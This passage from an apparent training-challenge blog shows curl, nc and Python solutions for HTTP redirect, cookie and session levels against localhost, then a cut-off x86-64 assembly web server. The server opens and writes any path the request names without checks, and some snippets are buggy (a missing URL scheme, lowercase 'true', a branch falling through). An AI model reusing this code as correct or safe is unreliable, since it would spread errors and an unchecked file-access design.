<h5 id="python-9"><a href="#python-9" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;6c924b91dc3acbfe942f9a313d81c607&quot;</span>,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;9b0456d0&quot;</span>,<br>        <span class="hljs-string">&quot;d&quot;</span>:[<br>            <span class="hljs-string">&quot;96f87ee7&quot;</span>,<br>            <span class="hljs-string">&quot;1e81e83f 35de65b4&amp;ecedb67b#29d8d3c2&quot;</span><br>        ]<br>    &#125;<br>&#125;<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span><br>&#125;<br><br>response = requests.post(url,headers = headers,data=json.dumps(data))<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><blockquote>
<p>Follow an HTTP redirect from HTTP response</p>
</blockquote>
<h5 id="curl-10"><a href="#curl-10" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -L</span><br></code></pre></td></tr></table></figure>
<h5 id="nc-10"><a href="#nc-10" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET /8987117b1c7a13a67e6ebdab1040b023 HTTP/1.1<br></code></pre></td></tr></table></figure>

<h5 id="python-10"><a href="#python-10" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br><br><span class="hljs-comment"># &#x27;allow_redirects=true&#x27; is default option, can be removed</span><br>response = requests.get(url,allow_redirects=true)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h4><blockquote>
<p>Include a cookie from HTTP response</p>
</blockquote>
<h5 id="curl-11"><a href="#curl-11" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -v</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 --cookie <span class="hljs-string">&quot;cookie=b0a72e415cbb83c7d2671097074329c0&quot;</span></span><br></code></pre></td></tr></table></figure>

<h5 id="nc-11"><a href="#nc-11" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br>Cookie: cookie=4203ce2d43f46581fe45652da89f9310<br></code></pre></td></tr></table></figure>

<h5 id="python-11"><a href="#python-11" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br><span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> s:<br>    r = s.get(url)<br>    <span class="hljs-built_in">print</span>(r.content)<br><br></code></pre></td></tr></table></figure>

<h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h4><blockquote>
<p>Make multiple requests in response to stateful HTTP responses</p>
</blockquote>
<h5 id="curl-12"><a href="#curl-12" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -v</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 --cookie <span class="hljs-string">&quot;session=eyJzdGF0ZSI6MX0.ZqI1lw.eBOyNFmp0kEvgn4a1KTi6--ZyvE&quot;</span> -v</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 --cookie <span class="hljs-string">&quot;session=eyJzdGF0ZSI6Mn0.ZqI1vA.zPh9QlVY-OvqFsXUk6IvcmafTBU&quot;</span> -v</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 --cookie <span class="hljs-string">&quot;session=eyJzdGF0ZSI6M30.ZqI2AQ.71jPgAYQa35fYtKd79FZU9l2Omg&quot;</span> -v</span><br></code></pre></td></tr></table></figure>

<h5 id="nc-12"><a href="#nc-12" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br>Cookie: session=eyJzdGF0ZSI6MX0.ZqI20w.GYw4a8ICn5uSqs2EPgpS6VPwfmE<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br>Cookie: session=eyJzdGF0ZSI6Mn0.ZqI4EA.ZyJQGgplU-tBR8ZmkGnhwt9-fWE<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br>Cookie: session=eyJzdGF0ZSI6M30.ZqI4NA.G_jGq5vQx6fd2HY3SgqzG95ZXo4<br></code></pre></td></tr></table></figure>

<h5 id="python-12"><a href="#python-12" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br><span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> s:<br>    r = s.get(url)<br>    <span class="hljs-built_in">print</span>(r.content)<br></code></pre></td></tr></table></figure>

<h2 id="building-a-web-server"><a href="#building-a-web-server" class="headerlink" title="building-a-web-server"></a>building-a-web-server</h2><h3 id="challenges"><a href="#challenges" class="headerlink" title="challenges"></a>challenges</h3><p>这是最终的程序</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><code class="hljs X86ASM"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta"></span><br><span class="hljs-meta">.globl</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta">.text</span><br><br>#============================================<br># function<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">call</span> main<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span>     # SYS_exit<br>    <span class="hljs-keyword">syscall</span><br><br>#============================================<br># function<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]     listen_fd<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>]    accept_fd<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>]    fork_fd<br><span class="hljs-symbol">main:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0x18</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span>     # SYS_socket<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>], <span class="hljs-built_in">rax</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, sockaddr_in<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span>     # SYS_bind<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span>     # SYS_listen<br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">main_loop:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span>     # SYS_accept<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>], <span class="hljs-built_in">rax</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">57</span>     # SYS_fork<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>], <span class="hljs-built_in">rax</span><br><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> main_subprocess<br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span>      # SYS_close<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">jmp</span> main_loop<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">main_subprocess:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span>      # SYS_close<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>]<br>    <span class="hljs-keyword">call</span> process<br><br>    <span class="hljs-keyword">leave</span><br>    <span class="hljs-keyword">ret</span><br><br>#============================================<br># process(<span class="hljs-keyword">int</span> fd)<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]         fd<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]       request<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x808</span>]       file_path<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>]       file_fd<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc10</span>]       file_data<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc18</span>]       file_data_len<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc20</span>]       data_addr<br><span class="hljs-symbol">process:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0xc20</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>], <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1024</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span>       # SYS_read<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x808</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1024</span><br>    <span class="hljs-keyword">call</span> get_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-string">&#x27;G&#x27;</span><br>    <span class="hljs-keyword">je</span> process_get<br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-string">&#x27;P&#x27;</span><br>    <span class="hljs-keyword">je</span> process_post<br>    <span class="hljs-keyword">jmp</span> process_error<br><span class="hljs-symbol">process_get:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x808</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span> ,<span class="hljs-number">2</span>       # SYS_open<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc10</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1024</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span>       # SYS_read<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc18</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span>      # SYS_close<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, reponse<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span>      # SYS_write<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc10</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc18</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span>      # SYS_write<br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol">process_post:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-built_in">rcx</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x0a0d0a0d</span><br>    <span class="hljs-keyword">jne</span> process_post<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-built_in">rcx</span>]<br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc20</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x808</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">65</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0777</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>    # SYS_open<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc20</span>]<br>    <span class="hljs-keyword">call</span> strlen<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc20</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span>      # SYS_write<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc18</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span>      # SYS_close<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, reponse<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span>      # SYS_write<br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol">process_error:</span><br>    <span class="hljs-keyword">leave</span><br>    <span class="hljs-keyword">ret</span><br><br>#============================================<br># <span class="hljs-keyword">int</span> get_path(char *read_request,char *open_path,size_t len)<br><span class="hljs-symbol">get_path:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0x28</span><br><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>], <span class="hljs-built_in">rdi</span>                  # 